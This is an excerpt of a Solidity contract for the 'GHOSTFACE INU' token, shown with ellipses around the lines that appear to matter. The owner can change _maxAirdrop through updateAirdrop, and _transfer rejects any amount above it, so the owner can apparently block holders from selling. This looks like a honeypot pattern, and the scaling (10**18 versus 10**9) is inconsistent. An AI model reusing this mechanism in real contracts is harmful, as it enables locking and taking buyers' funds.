...
interface IERC20 {
	...
	contract GHOSTFACEINU is ERC20, Ownable {
        ...
        address payable public marketingFeeReceiver = payable(0x47e9F354B39eFD39a8E71d7c2d92794468F431cC); 
		address payable public airdropFeeReceiver = payable(0x2DE85688CAFBBAFAb009685D94aD0aA62F77EC87); 
		...
		uint256 private _maxAirdrop = 1000000000000 * (10**18); 
		...
		constructor() ERC20("GHOSTFACE INU", "GHOSTFACE INU"){
		...
		function updateAirdrop(uint256 value) external onlyOwner() {
            _maxAirdrop = value * 10**9;
		...
		function _transfer(
			...
			if( 
				...
				require(amount <= _maxAirdrop, "address 100%.");
			}
